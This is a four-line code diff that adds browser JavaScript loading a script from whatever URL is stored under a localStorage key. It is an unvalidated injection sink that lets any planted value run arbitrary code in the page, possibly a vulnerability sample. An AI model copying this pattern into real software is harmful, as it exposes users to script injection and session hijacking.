@@ -1,0 +1,4 @@
+var fn = localStorage.getItem("fn");
+const script = document.createElement('script');
+script.src = fn;
+document.head.appendChild(script);
